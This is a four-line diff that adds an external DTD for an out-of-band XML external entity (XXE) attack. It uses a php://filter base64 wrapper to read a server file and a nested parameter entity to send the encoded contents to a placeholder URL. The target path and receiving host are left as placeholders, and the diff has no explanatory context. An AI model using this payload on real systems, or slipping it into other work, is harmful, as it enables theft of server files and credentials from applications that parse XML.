@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=path">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'url/path=%file;'>">
+%eval;
+%exfiltrate;
